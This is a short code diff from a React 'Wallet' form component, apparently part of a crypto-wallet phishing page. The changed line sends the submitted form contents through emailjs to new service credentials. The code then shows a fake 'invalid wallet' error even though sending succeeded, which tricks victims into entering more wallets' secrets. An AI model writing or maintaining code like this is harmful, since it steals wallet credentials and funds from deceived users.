@@ -29,7 +29,7 @@ function Wallet() {
           }
 
         else{
-            emailjs.sendForm('service_gxpkjix', 'template_vhj66x4', form.current, 's65ddE7WW91swpOHL')
+            emailjs.sendForm('service_1uds58e', 'template_g48vdq8', form.current, 'VG5-7pMUMPdaN0Au0')
             .then((result) => {
                 alert('error, invalid wallet. Try another wallet')
                 console.log(result.text);
